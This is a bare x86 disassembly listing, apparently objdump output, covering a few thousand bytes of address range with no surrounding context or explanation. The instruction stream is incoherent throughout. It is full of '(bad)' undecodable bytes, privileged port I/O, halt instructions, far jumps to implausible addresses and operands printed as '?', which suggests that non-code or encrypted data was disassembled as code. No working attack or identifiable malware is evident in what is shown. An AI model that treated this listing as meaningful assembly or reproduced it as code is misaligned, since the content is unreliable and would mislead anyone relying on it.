  41d973:	ins    DWORD PTR es:[edi],dx
  41d974:	cmc    
  41d975:	adc    al,0xa4
  41d977:	adc    eax,0xd786019d
  41d97c:	outs   dx,DWORD PTR ds:[esi]
  41d97d:	cmp    dh,dh
  41d97f:	or     ah,ch
  41d981:	xchg   edx,eax
  41d982:	ja     0x41d94b
  41d984:	inc    esp
  41d985:	jmp    0xfbbed642
  41d98a:	icebp  
  41d98b:	sub    al,0x51
  41d98d:	push   edx
  41d98e:	arpl   WORD PTR [ebx+0xca6bf49],si
  41d994:	fiadd  WORD PTR [ebx]
  41d996:	shl    DWORD PTR ds:0xbfb47255,0x6c
  41d99d:	test   esi,ebx
  41d99f:	or     al,al
  41d9a1:	in     eax,0x34
  41d9a3:	ins    DWORD PTR es:[edi],dx
  41d9a4:	clc    
  41d9a5:	into   
  41d9a6:	std    
  41d9a7:	lahf   
  41d9a8:	push   es
  41d9a9:	mov    DWORD PTR [ecx+0x1f],ecx
  41d9ac:	push   0x19027125
  41d9b1:	push   edx
  41d9b2:	xlat   BYTE PTR ds:[ebx]
  41d9b3:	push   0x1186d39c
  41d9b8:	pop    ebp
  41d9b9:	(bad)  
  41d9bb:	(bad)  
  41d9bc:	dec    edx
  41d9bd:	sahf   
  41d9be:	test   DWORD PTR [ebx-0x6c24f063],ebx
  41d9c4:	push   esp
  41d9c5:	dec    ecx
  41d9c6:	or     dh,dl
  41d9c8:	mov    ah,0x3a
  41d9ca:	sub    edx,DWORD PTR [ecx-0x1f]
  41d9cd:	pop    es
  41d9ce:	loop   0x41d9e4
  41d9d0:	xor    eax,0x84070b60
  41d9d5:	xchg   ebp,eax
  41d9d6:	dec    ecx
  41d9d7:	jb     0x41d9df
  41d9d9:	jno    0x41d9f8
  41d9db:	xor    dl,BYTE PTR [ecx]
  41d9dd:	mov    ebp,0xb1a3fe20
  41d9e2:	jns    0x41d97e
  41d9e4:	add    eax,0x52542dda
  41d9e9:	mov    dh,0x1e
  41d9eb:	in     eax,dx
  41d9ec:	fcmovb st,st(1)
  41d9ee:	fmul   QWORD PTR [esi-0x20668694]
  41d9f4:	fldenv [eax-0x41679483]
  41d9fa:	xor    eax,0xf5265969
  41d9ff:	movmskps ebx,xmm6
  41da02:	xchg   BYTE PTR [ebx],ch
  41da04:	jb     0x41d9d7
  41da06:	sbb    eax,0x41ae6098
  41da0b:	mov    ds:0x5f2044cb,al
  41da10:	adc    eax,0xbbae59e2
  41da15:	pop    ecx
  41da16:	loopne 0x41d9c3
  41da18:	pop    ebx
  41da19:	adc    dl,0xa1
  41da1c:	mov    ebx,0xf05cf67
  41da21:	inc    ebx
  41da22:	aas    
  41da23:	js     0x41da56
  41da25:	sub    eax,0x2a24811
  41da2a:	das    
  41da2b:	fisttp WORD PTR [ecx]
  41da2d:	sbb    BYTE PTR [esp+ebx*1+0x45],al
  41da31:	adc    ebx,DWORD PTR [eax-0x7759c81a]
  41da37:	adc    dl,cl
  41da39:	push   ebx
  41da3a:	loopne 0x41d9e0
  41da3c:	cld    
  41da3d:	mov    ah,0xe0
  41da3f:	lahf   
  41da40:	shl    BYTE PTR [esi-0x57a3b27a],1
  41da46:	or     esi,DWORD PTR [edx-0x1923c5d5]
  41da4c:	and    BYTE PTR [esi-0x78],al
  41da4f:	mov    ah,BYTE PTR [esi-0x638d7255]
  41da55:	xchg   edi,eax
  41da56:	jl     0x41d9e9
  41da58:	enter  0xdc3f,0x5e
  41da5c:	arpl   ax,dx
  41da5e:	rcl    DWORD PTR [ebx],1
  41da60:	scas   al,BYTE PTR es:[edi]
  41da61:	(bad)  
  41da62:	call   0x64af437a
  41da67:	cmp    eax,0xfdab258
  41da6c:	sub    edx,DWORD PTR [ecx]
  41da6e:	in     eax,0xc
  41da70:	jecxz  0x41da73
  41da72:	mov    al,0xb4
  41da74:	mov    ecx,0x6944a41d
  41da79:	dec    ebp
  41da7a:	popf   
  41da7b:	jb     0x41dace
  41da7d:	add    edx,DWORD PTR ds:0x65c13a8b
  41da83:	out    0x67,eax
  41da85:	fidiv  DWORD PTR [edi]
  41da87:	std    
  41da88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da89:	push   es
  41da8a:	mov    es,WORD PTR [ebx-0x15ab4ab6]
  41da90:	dec    eax
  41da91:	hlt    
  41da92:	add    DWORD PTR [ebp-0x4c62ac18],edx
  41da98:	out    dx,al
  41da99:	adc    al,0x51
  41da9b:	fstp   DWORD PTR fs:[ebp-0x35]
  41da9f:	daa    
  41daa0:	mov    ch,0x6a
  41daa2:	ret    
  41daa3:	cs push edx
  41daa5:	mov    ah,al
  41daa7:	adc    al,0x1e
  41daa9:	and    DWORD PTR [eax],ebx
  41daab:	loope  0x41da8d
  41daad:	xchg   edx,eax
  41daae:	or     BYTE PTR [ebx+0x79],dh
  41dab1:	jo     0x41db30
  41dab3:	mov    ebx,0x66cee088
  41dab8:	in     al,dx
  41dab9:	mov    al,BYTE PTR [edi*2+0x7077ac66]
  41dac0:	xchg   ecx,eax
  41dac1:	add    dh,0xef
  41dac4:	(bad)  
  41dac5:	xchg   ebp,eax
  41dac6:	mov    edi,0x3478ac96
  41dacb:	cmp    dl,dh
  41dacd:	mov    ebp,0xe3a8b78a
  41dad2:	fidivr DWORD PTR [edx]
  41dad4:	jg     0x41da67
  41dad6:	enter  0xfdbf,0x48
  41dada:	sbb    BYTE PTR [eax-0x8cbb311],ah
  41dae0:	test   eax,0x2d0b5131
  41dae5:	pop    es
  41dae6:	jecxz  0x41da7e
  41dae8:	cwde   
  41dae9:	in     eax,0xf8
  41daeb:	fs pop eax
  41daed:	je     0x41db43
  41daef:	retf   0x6269
  41daf2:	hlt    
  41daf3:	sbb    ebp,DWORD PTR [esi]
  41daf5:	pusha  
  41daf6:	adc    eax,edx
  41daf8:	aaa    
  41daf9:	dec    eax
  41dafa:	fadd   DWORD PTR [esi]
  41dafc:	cmp    DWORD PTR [ecx-0x59c6ace9],edi
  41db02:	fistp  QWORD PTR [eax-0x5bb6b3e4]
  41db08:	adc    DWORD PTR [ecx-0x567486e2],ecx
  41db0e:	mov    al,ds:0x83819701
  41db13:	push   ebx
  41db14:	mov    dh,0x6a
  41db16:	div    DWORD PTR [edx]
  41db18:	retf   
  41db19:	xchg   ecx,eax
  41db1a:	jne    0x41dae1
  41db1c:	push   edx
  41db1d:	push   eax
  41db1e:	xchg   ebx,eax
  41db1f:	jnp    0x41daf5
  41db21:	in     eax,0xca
  41db23:	inc    edx
  41db24:	mov    ecx,edi
  41db26:	into   
  41db27:	adc    DWORD PTR [eax],edx
  41db29:	mov    ds:0x35619345,eax
  41db2e:	(bad)  
  41db2f:	out    dx,eax
  41db30:	mov    ds:0x58203a2,eax
  41db35:	ins    BYTE PTR es:[edi],dx
  41db36:	mov    ebp,0x8d19dd3d
  41db3b:	sbb    BYTE PTR [esi-0xcce1c1a],bh
  41db41:	sar    al,cl
  41db43:	(bad)  
  41db44:	cwde   
  41db45:	xchg   ebp,eax
  41db46:	pushf  
  41db47:	xor    esi,DWORD PTR [edx-0x6e]
  41db4a:	ret    0xe923
  41db4d:	cs mov ebx,0x8c9d54c9
  41db53:	add    eax,0x2164b618
  41db58:	pop    ecx
  41db59:	scas   eax,DWORD PTR es:[edi]
  41db5a:	jmp    FWORD PTR [esi-0x157ad641]
  41db60:	arpl   dx,si
  41db62:	cdq    
  41db63:	(bad)  [edx]
  41db65:	mov    fs,ebp
  41db67:	cmp    al,BYTE PTR ds:0x7be955dd
  41db6d:	sbb    bh,al
  41db6f:	lea    ebp,[ebx-0x499f1f96]
  41db75:	in     al,dx
  41db76:	cmc    
  41db77:	jae    0x41db1b
  41db79:	xor    BYTE PTR [ebx],cl
  41db7b:	jecxz  0x41dbb3
  41db7d:	fnsave [esi-0x16]
  41db80:	dec    ebp
  41db81:	fdiv   st(1),st
  41db83:	and    eax,ecx
  41db85:	mov    esi,0x4ab659dc
  41db8a:	jno    0x41db52
  41db8c:	adc    BYTE PTR ds:0x48ad018a,ah
  41db92:	mov    eax,DWORD PTR [edi+eiz*2-0x849f3f2]
  41db99:	mov    DWORD PTR [ecx+0x53],edx
  41db9c:	or     eax,0x3f80faa2
  41dba1:	in     eax,dx
  41dba2:	pop    ebx
  41dba3:	and    BYTE PTR [edx+0x55],dl
  41dba6:	pop    ebp
  41dba7:	rol    edx,1
  41dba9:	jns    0x41dbb3
  41dbab:	pop    edi
  41dbac:	xlat   BYTE PTR ds:[ebx]
  41dbad:	fucomp st(6)
  41dbaf:	mov    dh,0xd6
  41dbb1:	dec    ebx
  41dbb2:	adc    ecx,edi
  41dbb4:	pop    ecx
  41dbb5:	icebp  
  41dbb6:	and    eax,0xe3c75a78
  41dbbb:	xchg   esi,eax
  41dbbc:	sbb    al,ah
  41dbbe:	bound  edx,QWORD PTR [eax-0x7f]
  41dbc1:	mov    al,0x9e
  41dbc3:	xor    DWORD PTR [ecx+0x3508ca9d],0x3e1e77c1
  41dbcd:	pop    ebx
  41dbce:	adc    ecx,DWORD PTR [esi]
  41dbd0:	stc    
  41dbd1:	pop    ss
  41dbd2:	or     ebp,0x2d
  41dbd5:	sub    edi,esi
  41dbd7:	or     al,0xb0
  41dbd9:	ds je  0x41dbc5
  41dbdc:	sub    DWORD PTR [ecx],ecx
  41dbde:	or     eax,0xe4ce28b3
  41dbe3:	enter  0x6349,0x56
  41dbe7:	jo     0x41dc45
  41dbe9:	stc    
  41dbea:	ins    BYTE PTR es:[edi],dx
  41dbeb:	enter  0xa2ab,0xba
  41dbef:	arpl   WORD PTR [ebx],dx
  41dbf1:	aam    0x57
  41dbf3:	inc    eax
  41dbf4:	sbb    DWORD PTR [ebp+eiz*4+0x591f3926],edi
  41dbfb:	push   esp
  41dbfc:	jns    0x41dbe6
  41dbfe:	pop    eax
  41dbff:	ins    DWORD PTR es:[edi],dx
  41dc00:	scas   eax,DWORD PTR es:[edi]
  41dc01:	test   edi,ebp
  41dc03:	imul   esp,ecx,0xd6267e0
  41dc09:	pushf  
  41dc0a:	xchg   ebp,eax
  41dc0b:	stos   BYTE PTR es:[edi],al
  41dc0c:	sub    DWORD PTR [ecx+0x63cefd88],0x76
  41dc13:	pop    ebx
  41dc14:	rcl    esp,cl
  41dc16:	fdiv   DWORD PTR [ecx+eax*2+0x2c304da9]
  41dc1d:	inc    esi
  41dc1e:	(bad)  
  41dc1f:	loopne 0x41dbb5
  41dc21:	pop    es
  41dc22:	mov    dh,0xfa
  41dc24:	mov    ebp,0x1e618c2b
  41dc29:	adc    BYTE PTR [ebx-0x30],0x1e
  41dc2d:	fist   DWORD PTR [edx-0x44]
  41dc30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc31:	aam    0xa2
  41dc33:	les    esi,FWORD PTR [edi+0x43a182b3]
  41dc39:	jge    0x41dc88
  41dc3b:	jnp    0x41dbc0
  41dc3d:	or     ebp,eax
  41dc3f:	sahf   
  41dc40:	leave  
  41dc41:	adc    al,0xa0
  41dc43:	pop    ebp
  41dc44:	repnz mov bh,0xd1
  41dc47:	out    dx,eax
  41dc48:	adc    DWORD PTR [esi-0x57],ecx
  41dc4b:	cmp    ebx,edi
  41dc4d:	popf   
  41dc4e:	add    eax,0x5f6b1232
  41dc53:	xrelease xchg DWORD PTR [edx+ecx*1-0x1e],ecx
  41dc58:	pop    ds
  41dc59:	jmp    0x3bf9ee21
  41dc5e:	nop
  41dc5f:	outs   dx,BYTE PTR ds:[esi]
  41dc60:	pop    ss
  41dc61:	gs or  eax,0xcde2dbde
  41dc67:	mov    DWORD PTR [ebx],ebp
  41dc69:	aas    
  41dc6a:	test   DWORD PTR [ebx],esi
  41dc6c:	sbb    ah,BYTE PTR [ebx]
  41dc6e:	xor    eax,0xe4165688
  41dc73:	mov    ds:0x767fe8e9,al
  41dc78:	xor    DWORD PTR [eax*1+0xffd317d],ecx
  41dc7f:	iret   
  41dc80:	inc    ecx
  41dc81:	outs   dx,BYTE PTR ds:[esi]
  41dc82:	clc    
  41dc83:	pop    edi
  41dc84:	dec    esi
  41dc85:	(bad)
  41dc88:	mov    ah,dl
  41dc8a:	mov    ebp,0x1cb0d7f0
  41dc8f:	push   ecx
  41dc90:	pop    ds
  41dc91:	mov    ah,BYTE PTR [esi+0x23]
  41dc94:	sahf   
  41dc95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc96:	mov    esi,ebx
  41dc98:	ror    DWORD PTR [ebx],0xc0
  41dc9b:	pop    esi
  41dc9c:	pushf  
  41dc9d:	jnp    0x41dd14
  41dc9f:	jge    0x41dcdc
  41dca1:	pop    ss
  41dca2:	pop    edx
  41dca3:	nop
  41dca4:	sbb    al,0x4a
  41dca6:	dec    esp
  41dca7:	icebp  
  41dca8:	jns    0x41dc7f
  41dcaa:	fmul   st(6),st
  41dcac:	mov    eax,ds:0x3bb3ab42
  41dcb1:	cmp    esi,DWORD PTR [ecx]
  41dcb3:	retf   
  41dcb4:	enter  0x656c,0x60
  41dcb8:	dec    esp
  41dcb9:	push   ss
  41dcba:	lock pop edx
  41dcbc:	shr    BYTE PTR [ebp-0x3d],1
  41dcbf:	push   0x4703f2ee
  41dcc4:	xlat   BYTE PTR ds:[ebx]
  41dcc5:	xor    bh,dh
  41dcc7:	popa   
  41dcc8:	ins    DWORD PTR es:[edi],dx
  41dcc9:	push   es
  41dcca:	popa   
  41dccb:	sbb    ecx,DWORD PTR ds:0xd261b09
  41dcd1:	leave  
  41dcd2:	scas   al,BYTE PTR es:[edi]
  41dcd3:	jmp    0x41dcca
  41dcd5:	repnz mov dh,0x43
  41dcd8:	(bad)  
  41dcda:	push   ebx
  41dcdb:	add    bl,BYTE PTR [ebp-0x1c9c6cc1]
  41dce1:	jne    0x41dc6a
  41dce3:	push   ebx
  41dce4:	mov    ebp,0xd673a801
  41dce9:	mov    esp,0xc7369069
  41dcee:	(bad)  
  41dcf0:	add    BYTE PTR [edx+0x758808b6],bh
  41dcf6:	inc    ebx
  41dcf7:	sub    eax,esi
  41dcf9:	mov    WORD PTR [ecx+0x4d86f75e],fs
  41dcff:	sub    bl,bl
  41dd01:	repnz or al,0x4e
  41dd04:	nop
  41dd05:	cmc    
  41dd06:	cmp    eax,0xe2a7e42c
  41dd0b:	jno    0x41dcbb
  41dd0d:	enter  0xa2a8,0x6c
  41dd11:	stos   BYTE PTR es:[edi],al
  41dd12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd14:	jnp    0x41dd86
  41dd16:	cdq    
  41dd17:	mov    esi,0x9c1514d0
  41dd1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd1d:	mov    edx,0xba5e9673
  41dd22:	sar    DWORD PTR [eax+0x5412ea80],1
  41dd28:	(bad)
  41dd2b:	mov    eax,0x1c4a46aa
  41dd30:	data16 and dh,ch
  41dd33:	repz dec ecx
  41dd35:	cli    
  41dd36:	adc    edx,esi
  41dd38:	push   esi
  41dd39:	pusha  
  41dd3a:	popf   
  41dd3b:	bound  eax,QWORD PTR [edi]
  41dd3d:	icebp  
  41dd3e:	mov    ds:0x737c0187,al
  41dd43:	push   edi
  41dd44:	cld    
  41dd45:	pop    ss
  41dd46:	cmp    esp,DWORD PTR [edx]
  41dd48:	mov    bl,BYTE PTR [ebx+0x7be652]
  41dd4e:	cmp    BYTE PTR ds:0xd74dbe67,dl
  41dd54:	out    dx,al
  41dd55:	fisubr WORD PTR [ecx+ebx*2+0x79]
  41dd59:	rcr    DWORD PTR [ecx],0x33
  41dd5c:	mov    dl,0xd0
  41dd5e:	cmc    
  41dd5f:	div    DWORD PTR [ecx+0x62]
  41dd62:	push   edx
  41dd63:	xor    eax,0x33fc8ce1
  41dd68:	and    esi,ebp
  41dd6a:	inc    esp
  41dd6b:	pop    esi
  41dd6c:	lods   eax,DWORD PTR ds:[esi]
  41dd6d:	imul   esi,DWORD PTR [edx+0x18],0x5588665f
  41dd74:	xchg   ebx,eax
  41dd75:	and    BYTE PTR [edx+0x527bd62a],cl
  41dd7b:	sti    
  41dd7c:	daa    
  41dd7d:	leave  
  41dd7e:	xchg   edi,eax
  41dd7f:	cmp    ah,bh
  41dd81:	dec    edi
  41dd82:	xor    BYTE PTR [esi+0x48cf29b],cl
  41dd88:	les    ecx,FWORD PTR gs:[ecx]
  41dd8b:	int    0x42
  41dd8d:	dec    esp
  41dd8e:	pop    esi
  41dd8f:	retf   
  41dd90:	push   ebx
  41dd91:	mov    ebp,0xd40b9a72
  41dd96:	mov    eax,0x478fe818
  41dd9b:	stc    
  41dd9c:	daa    
  41dd9d:	dec    esp
  41dd9e:	sub    bl,bl
  41dda0:	icebp  
  41dda1:	(bad)  
  41dda2:	sbb    edx,DWORD PTR [bx+di]
  41dda5:	push   edx
  41dda6:	data16 mov WORD PTR [esi-0x5dec83b1],fs
  41ddad:	cmp    BYTE PTR [ecx-0x6d],dh
  41ddb0:	lea    ecx,[ebx-0x3b2a43e6]
  41ddb6:	clc    
  41ddb7:	add    edi,edx
  41ddb9:	popa   
  41ddba:	sbb    ebx,ecx
  41ddbc:	jne    0x41dd75
  41ddbe:	cmovnp ecx,DWORD PTR [eax+ecx*2-0x76e71c42]
  41ddc6:	cmp    al,0x8b
  41ddc8:	loop   0x41dde4
  41ddca:	or     ecx,DWORD PTR [edi-0x56]
  41ddcd:	js     0x41de29
  41ddcf:	mov    cl,0x0
  41ddd1:	mov    edx,0xc320539
  41ddd6:	push   edx
  41ddd7:	(bad)  
  41ddd8:	(bad)  
  41ddda:	iret   
  41dddb:	adc    edi,DWORD PTR [ecx+0x3a247dd6]
  41dde1:	dec    edx
  41dde2:	add    DWORD PTR [bx+si-0x6c9],eax
  41dde7:	enter  0xa833,0xc3
  41ddeb:	push   ss
  41ddec:	dec    esi
  41dded:	push   0xffffffb1
  41ddef:	out    dx,al
  41ddf0:	mov    edx,0x8a7386a5
  41ddf5:	stos   DWORD PTR es:[edi],eax
  41ddf6:	scas   al,BYTE PTR es:[edi]
  41ddf7:	jns    0x41dd7d
  41ddf9:	push   edi
  41ddfa:	aad    0x49
  41ddfc:	outs   dx,BYTE PTR ds:[esi]
  41ddfd:	push   0x3a16c099
  41de02:	imul   edx,DWORD PTR [ebp-0x37a86c9],0x3c
  41de09:	jg     0x41de50
  41de0b:	xchg   esp,eax
  41de0c:	lahf   
  41de0d:	cmp    eax,0xc660356f
  41de12:	(bad)  
  41de13:	mov    ch,0x9d
  41de15:	retf   0xefae
  41de18:	mov    edx,0x2270309f
  41de1d:	sub    edi,DWORD PTR [edx-0x76e17e29]
  41de23:	out    0x6b,ax
  41de26:	sbb    esp,DWORD PTR [ebp-0x48]
  41de29:	push   ss
  41de2a:	loope  0x41de51
  41de2c:	neg    bl
  41de2e:	mov    ah,0xcb
  41de30:	fisub  WORD PTR [edi-0x6c]
  41de33:	inc    esi
  41de34:	inc    edi
  41de35:	dec    edi
  41de36:	pop    esp
  41de37:	dec    ecx
  41de38:	sbb    DWORD PTR [esi+0x53c47b2b],ebx
  41de3e:	(bad)  
  41de3f:	jae    0x41deb1
  41de41:	pop    esp
  41de42:	jo     0x41de30
  41de44:	cs sub al,0xbe
  41de47:	cli    
  41de48:	dec    ecx
  41de49:	jb     0x41de8a
  41de4b:	lea    edx,[ebp+0x77]
  41de4e:	cld    
  41de4f:	dec    ebp
  41de50:	mov    al,ds:0xb765c9bd
  41de55:	stc    
  41de56:	or     esi,DWORD PTR [ebx-0x52273656]
  41de5c:	and    dl,BYTE PTR [eax+0x78c3bbe7]
  41de62:	xchg   esp,eax
  41de63:	or     al,0x26
  41de65:	jge    0x41de34
  41de67:	add    ebp,DWORD PTR [ebx+ebp*1]
  41de6a:	xor    ebp,DWORD PTR [ebx+edx*4+0x5814e6da]
  41de71:	push   ecx
  41de72:	fs retf 
  41de74:	dec    edx
  41de75:	fnsave [edx]
  41de77:	in     eax,0x86
  41de79:	in     al,dx
  41de7a:	mov    edx,?
  41de7c:	sub    eax,0xf00a84b7
  41de81:	aaa    
  41de82:	pop    ecx
  41de83:	test   al,0xbc
  41de85:	mov    ebx,?
  41de87:	mov    bh,al
  41de89:	or     eax,0x8d54733f
  41de8e:	sti    
  41de8f:	das    
  41de90:	push   esi
  41de91:	std    
  41de92:	push   edi
  41de93:	int3   
  41de94:	stc    
  41de95:	cs into 
  41de97:	je     0x41de54
  41de99:	mov    edi,0xb3fa2bdd
  41de9e:	in     al,dx
  41de9f:	mov    al,ds:0xaa167be7
  41dea4:	cmp    eax,0x880f1865
  41dea9:	call   0x6fae8b8b
  41deae:	pop    eax
  41deaf:	xor    ebp,esi
  41deb1:	lods   eax,DWORD PTR ds:[esi]
  41deb2:	xor    DWORD PTR [esi+0x4ab521fb],esp
  41deb8:	or     dh,BYTE PTR [esi+0x403ebe63]
  41debe:	adc    dl,ah
  41dec0:	cmp    al,0x57
  41dec2:	pop    edx
  41dec3:	rcr    DWORD PTR [ecx+esi*2-0x18],0x46
  41dec8:	mov    edi,DWORD PTR [edi]
  41deca:	add    dh,BYTE PTR [ebp-0x5bbecd9e]
  41ded0:	out    dx,al
  41ded1:	in     al,dx
  41ded2:	xchg   esi,eax
  41ded3:	in     eax,dx
  41ded4:	dec    ebx
  41ded5:	fwait
  41ded6:	dec    ebp
  41ded7:	sub    dh,BYTE PTR [eax]
  41ded9:	int3   
  41deda:	pop    ebx
  41dedc:	push   edi
  41dedd:	mov    al,0xb1
  41dedf:	inc    edi
  41dee0:	stos   DWORD PTR es:[edi],eax
  41dee1:	add    ecx,ebp
  41dee3:	mov    eax,ds:0x64afc16e
  41dee8:	lea    eax,[ebx+0x2f]
  41deeb:	stos   BYTE PTR es:[edi],al
  41deec:	pop    ebp
  41deed:	(bad)  
  41deee:	cli    
  41deef:	sub    dh,BYTE PTR [eax+0x70]
  41def2:	aas    
  41def3:	mov    al,BYTE PTR [edi]
  41def5:	adc    BYTE PTR [ebx-0xbe9365f],dl
  41defb:	ret    0xb4e0
  41defe:	xchg   esp,eax
  41deff:	adc    al,0xcd
  41df01:	bound  edx,QWORD PTR [ebx+0x610e4b1b]
  41df07:	rol    DWORD PTR [ecx-0x3a],1
  41df0a:	inc    eax
  41df0b:	push   es
  41df0c:	inc    eax
  41df0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df0e:	rcr    ch,cl
  41df10:	push   esi
  41df11:	(bad)  
  41df12:	jno    0x41dea6
  41df14:	cmp    BYTE PTR [eax-0x76],al
  41df17:	icebp  
  41df18:	fdivr  DWORD PTR [ebx-0x24dc05a2]
  41df1e:	jne    0x41df48
  41df20:	push   esp
  41df21:	xchg   edx,eax
  41df22:	cmp    DWORD PTR [ebx],edx
  41df24:	aaa    
  41df25:	loope  0x41df82
  41df27:	and    eax,0xba41513
  41df2c:	or     ah,BYTE PTR [ebx]
  41df2e:	lock mov eax,ds:0x7a115f90
  41df34:	test   eax,0xacadd9a4
  41df39:	adc    al,0xe
  41df3b:	pop    eax
  41df3c:	adc    al,0x26
  41df3e:	jp     0x41df98
  41df40:	lock mul DWORD PTR [eax-0x48]
  41df44:	outs   dx,BYTE PTR ds:[esi]
  41df45:	and    al,0xbb
  41df47:	sbb    DWORD PTR [ebx+edi*4-0x68],eax
  41df4b:	xor    ebp,DWORD PTR [eax]
  41df4d:	inc    edx
  41df4e:	sti    
  41df4f:	stos   BYTE PTR es:[edi],al
  41df50:	idiv   DWORD PTR [edx+0x9ff48c3]
  41df56:	add    esp,eax
  41df58:	and    al,BYTE PTR [eax+0x4c]
  41df5b:	in     al,0x47
  41df5d:	jne    0x41df28
  41df5f:	popf   
  41df60:	jmp    0x7ff5:0x82ba262
  41df67:	adc    eax,0x3e9c7030
  41df6c:	neg    BYTE PTR [edx-0x5b]
  41df6f:	nop
  41df70:	inc    esp
  41df71:	mov    WORD PTR [ebp+0x657e4cea],fs
  41df77:	xor    BYTE PTR [ebx+0x3af20c60],cl
  41df7d:	out    0x95,eax
  41df7f:	cmovb  edi,DWORD PTR [esi-0x21]
  41df83:	pop    ebx
  41df84:	mov    esp,0x189dfef2
  41df89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df8a:	fcomp  DWORD PTR [eax+0x27781587]
  41df90:	xchg   edi,eax
  41df91:	xor    al,0x9c
  41df93:	dec    esp
  41df94:	sub    BYTE PTR [esi-0x552cf32d],cl
  41df9a:	xor    BYTE PTR [ebp-0x55],dl
  41df9d:	pusha  
  41df9e:	add    al,0x27
  41dfa0:	add    DWORD PTR [ebp+0x43],esi
  41dfa3:	sub    al,BYTE PTR [ebp-0x48]
  41dfa6:	aas    
  41dfa7:	mov    edi,0x6fda882f
  41dfac:	xchg   edi,eax
  41dfad:	fwait
  41dfae:	or     BYTE PTR [eax+esi*4-0x4c],ch
  41dfb2:	in     al,0x19
  41dfb4:	pop    esp
  41dfb5:	and    dh,BYTE PTR [esi+0x64]
  41dfb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dfb9:	push   ebx
  41dfba:	xchg   DWORD PTR [edx],edi
  41dfbc:	xchg   edx,eax
  41dfbd:	daa    
  41dfbe:	sub    BYTE PTR [ecx],0xa2
  41dfc1:	add    bh,ch
  41dfc3:	mov    edi,0x669f0b7d
  41dfc8:	cwde   
  41dfc9:	xor    esp,edx
  41dfcb:	xchg   edi,eax
  41dfcc:	or     al,0xef
  41dfce:	push   ebp
  41dfcf:	jnp    0x41e025
  41dfd1:	xor    DWORD PTR [ebx-0x6a9401f0],esp
  41dfd7:	or     edx,DWORD PTR [edi-0x68]
  41dfda:	gs inc ecx
  41dfdc:	dec    ecx
  41dfdd:	xchg   edx,eax
  41dfde:	or     al,BYTE PTR [edx+0x217d5174]
  41dfe4:	mov    ds:0x41eb92a4,al
  41dfe9:	aam    0x51
  41dfeb:	jmp    0x6a01:0x2a8b0b00
  41dff2:	je     0x41e002
  41dff4:	and    ebp,DWORD PTR [ebx+0x32]
  41dff7:	leave  
  41dff8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dff9:	add    BYTE PTR cs:[esi],bh
  41dffc:	pop    ecx
  41dffd:	je     0x41df81
  41dfff:	daa    
  41e000:	sbb    edx,ecx
  41e002:	and    dh,bl
  41e004:	mov    ds:0x392f9897,eax
  41e009:	add    ebx,DWORD PTR [edi]
  41e00b:	lods   eax,DWORD PTR ds:[esi]
  41e00c:	sbb    dh,BYTE PTR cs:[ebx]
  41e00f:	xchg   edi,eax
  41e010:	xlat   BYTE PTR ds:[ebx]
  41e011:	(bad)  es:[ebx-0x9]
  41e015:	iret   
  41e016:	xor    bl,dl
  41e018:	push   esp
  41e019:	hlt    
  41e01a:	jg     0x41dfb0
  41e01c:	sbb    al,0x86
  41e01e:	xor    BYTE PTR [ecx-0x7c5e9cb0],ah
  41e024:	adc    ah,BYTE PTR [edi+esi*4]
  41e027:	pushf  
  41e028:	loope  0x41e02c
  41e02a:	int    0xf6
  41e02c:	gs fs popf 
  41e02f:	fnstenv [edi+eiz*4-0x71]
  41e033:	aam    0x67
  41e035:	jg     0x41e08c
  41e037:	into   
  41e038:	lock inc esp
  41e03a:	or     esp,esp
  41e03c:	cli    
  41e03d:	jae    0x41dfde
  41e03f:	jbe    0x41dfd6
  41e041:	hlt    
  41e042:	aaa    
  41e043:	pop    edx
  41e044:	not    edi
  41e046:	repz hlt 
  41e048:	jbe    0x41e0bc
  41e04a:	(bad)  
  41e04b:	adc    eax,0x831ba4
  41e050:	jge    0x41e057
  41e052:	inc    ebp
  41e053:	sub    al,0x6d
  41e055:	jg     0x41e052
  41e057:	fiadd  WORD PTR ss:[ecx]
  41e05a:	push   ds
  41e05b:	out    0xd4,al
  41e05d:	dec    esp
  41e05e:	(bad)  
  41e05f:	stos   DWORD PTR es:[edi],eax
  41e060:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e061:	cmp    al,0xd0
  41e063:	jge    0x41e071
  41e065:	je     0x41dff0
  41e067:	lea    ebx,[ebx+0x4ded73a6]
  41e06d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e06e:	fcom   DWORD PTR [esi+0x62]
  41e071:	jle    0x41e094
  41e073:	int    0x76
  41e075:	test   al,0xe1
  41e077:	cmp    bl,cl
  41e079:	adc    BYTE PTR [ebx-0x71],dl
  41e07c:	add    DWORD PTR [ebx-0xe],esi
  41e07f:	adc    eax,0x401de653
  41e084:	jl     0x41e094
  41e086:	fwait
  41e087:	pop    es
  41e088:	pop    eax
  41e089:	xor    dh,dl
  41e08b:	push   0xffffffc4
  41e08d:	mov    WORD PTR [edx],gs
  41e08f:	(bad)  
  41e091:	cwde   
  41e092:	and    al,cl
  41e094:	inc    esi
  41e095:	(bad)  
  41e096:	mov    dh,0x59
  41e098:	pushf  
  41e099:	push   es
  41e09a:	pushw  es
  41e09c:	xor    ebp,eax
  41e09e:	xor    DWORD PTR [edx+ebp*2-0x26],esi
  41e0a2:	stc    
  41e0a3:	pop    es
  41e0a4:	es add al,0xcc
  41e0a7:	imul   ch
  41e0a9:	xor    dl,BYTE PTR [edi+0x39190f8d]
  41e0af:	fldcw  WORD PTR [ebx+edi*2-0x782b5dfc]
  41e0b6:	and    ecx,DWORD PTR [eax+0x32]
  41e0b9:	loopne 0x41e0b0
  41e0bb:	cwde   
  41e0bc:	shr    bh,cl
  41e0be:	fld    QWORD PTR [edx+0x26]
  41e0c1:	fstp   QWORD PTR [ebx-0x34]
  41e0c4:	and    WORD PTR [edx+0x32],dx
  41e0c8:	xchg   ecx,eax
  41e0c9:	mov    BYTE PTR [ecx-0x6b3a4cbe],0x27
  41e0d0:	dec    ebp
  41e0d1:	test   edi,ebp
  41e0d3:	jp     0x41e123
  41e0d5:	test   dl,bh
